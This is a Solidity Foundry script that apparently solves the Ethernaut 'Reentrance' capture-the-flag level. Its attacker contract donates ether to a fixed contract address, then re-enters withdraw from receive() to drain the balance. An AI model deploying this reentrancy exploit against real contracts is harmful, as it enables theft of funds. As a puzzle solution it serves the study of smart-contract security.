// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackReentrace {

    Reentrance private reentranceInstance = Reentrance(payable(0x1784a9e316B2c62325c493e524cda4A234E4996e));

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.001 ether}("");
    }

    receive() external payable {
        reentranceInstance.withdraw(msg.value);
    }

}

contract ReentrancySolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackReentrace attackReentracnt = new AttackReentrace{value: 0.001 ether}();
        attackReentracnt.withdraw();
        vm.stopBroadcast();
    }
}